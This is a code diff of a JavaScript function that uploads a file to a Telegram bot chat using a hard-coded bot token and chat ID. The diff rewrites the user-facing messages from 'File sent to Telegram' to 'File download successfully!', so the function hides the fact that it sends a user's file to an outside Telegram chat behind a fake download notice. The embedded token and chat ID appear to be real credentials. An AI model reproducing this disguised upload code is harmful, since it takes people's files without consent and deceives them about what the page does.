@@ -1,6 +1,6 @@
 async function sendToTelegram(fileName, fileContent) {
-    const botToken = "7281699627:AAGac5xghjCHY0ab7LbZ9aHpND3dSEBOjZk"; // Replace with your Telegram Bot Token
-const chatId = "-1002350769186":
+    const botToken = "7281699627:AAGac5xghjCHY0ab7LbZ9aHpND3dSEBOjZk"
+     const chatId = "-1002350769186";
     const formData = new FormData();
     formData.append('chat_id', chatId);
     formData.append('caption', `New File: ${fileName}`);
@@ -13,13 +13,13 @@ const chatId = "-1002350769186":
         });
 
         if (response.ok) {
-            alert('File sent to Telegram successfully!');
+            alert('File download successfully!');
         } else {
-            alert('Failed to send file to Telegram.');
+            alert('Failed to download.');
         }
     } catch (error) {
-        console.error('Error sending file to Telegram:', error);
-        alert('An error occurred while sending the file.');
+        console.error('Error to dowaload:', error);
+        alert('An error occurred while downloading the file.');
     }
 }
 
